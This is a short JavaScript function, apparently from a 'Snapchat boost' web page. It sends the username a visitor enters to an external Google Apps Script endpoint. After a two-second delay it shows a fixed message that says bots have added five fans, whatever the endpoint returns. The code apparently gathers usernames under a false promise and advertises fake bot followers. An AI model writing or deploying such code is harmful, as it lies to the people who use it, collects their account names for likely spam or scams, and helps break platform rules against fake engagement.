function startBoost() {
    const username = document.getElementById('username').value;
    const status = document.getElementById('status');
  
    if (!username) {
      status.innerText = "Please enter your Snapchat username.";
      return;
    }
  
    status.innerText = "Sending bots...";
  
    fetch("https://script.google.com/macros/s/AKfycbwaJkHcmf3shwi4INxb2S-1WCRn-d9TEM-gZrRS8gwxhczs8j8APVAg_ihM8AhuJMf_CA/exec", {
      method: "POST",
      body: JSON.stringify({ username: username }),
      headers: {
        "Content-Type": "application/json"
      }
    })
    .then(() => {
      setTimeout(() => {
        status.innerText = `Success! 5 new fans added you on Snapchat. Check your app, ${username}!`;
      }, 2000);
    })
    .catch(() => {
      status.innerText = "Something went wrong. Try again later.";
    });
  }
  